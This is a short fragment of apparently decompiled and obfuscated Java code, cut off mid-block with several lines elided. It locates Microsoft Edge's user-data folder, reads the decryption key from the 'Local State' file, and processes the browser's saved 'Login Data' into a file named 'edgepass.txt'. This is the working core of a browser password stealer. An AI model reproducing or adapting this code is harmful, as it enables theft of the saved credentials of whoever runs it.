...
public class 0c {
   ...
   private static final String 1 = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data";
   ...
   private void _/* $FF was: 1*/() {
      ...
      byte[] key = this.0(new File(userData, "Local State"));
      if (key != null) {
         File loginData = new File(userData, "Default\\Login Data");

         try {
            if (loginData.exists()) {
               this.0(loginData, key, "", "edgepass.txt");
            }
